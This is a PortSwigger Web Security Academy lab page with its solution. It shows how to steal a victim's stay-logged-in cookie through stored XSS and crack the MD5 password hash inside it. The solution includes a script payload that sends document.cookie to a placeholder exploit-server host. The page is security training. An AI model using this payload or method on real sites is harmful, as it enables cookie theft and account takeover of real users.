# Lab: Offline password cracking

Source: https://portswigger.net/web-security/authentication/other-mechanisms/lab-offline-password-cracking
Fetched: 2026-06-28T09:17:40.997383+00:00

Web Security Academy

Authentication vulnerabilities

Other mechanisms

Lab

Lab: Offline password cracking

This lab stores the user's password hash in a cookie. The lab also contains an XSS vulnerability in the comment functionality. To solve the lab, obtain Carlos's stay-logged-in cookie and use it to crack his password. Then, log in as carlos and delete his account from the "My account" page.

Your credentials: wiener:peter

Victim's username: carlos

Solution

With Burp running, use your own account to investigate the "Stay logged in" functionality. Notice that the stay-logged-in cookie is Base64 encoded.

In the Proxy > HTTP history tab, go to the Response to your login request and highlight the stay-logged-in cookie, to see that it is constructed as follows:

username+':'+md5HashOfPassword

You now need to steal the victim user's cookie. Observe that the comment functionality is vulnerable to XSS.

Go to the exploit server and make a note of the URL.

Go to one of the blogs and post a comment containing the following stored XSS payload, remembering to enter your own exploit server ID:

<script>document.location='//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie</script>

On the exploit server, open the access log. There should be a GET request from the victim containing their stay-logged-in cookie.

Decode the cookie in Burp Decoder. The result will be:

carlos:26323c16d5f4dabff3bb136f2460a943

Copy the hash and paste it into a search engine. This will reveal that the password is onceuponatime.

Log in to the victim's account, go to the "My account" page, and delete their account to solve the lab.

Note

The purpose of this lab is to demonstrate the potential of cracking passwords offline. Most likely, this would be done using a tool like hashcat, for example. When testing your clients' websites, we do not recommend submitting hashes of their real passwords in a search engine.

Community solutions

Rana Khalil

Find vulnerabilities in your authentication using Burp Suite

Try for free
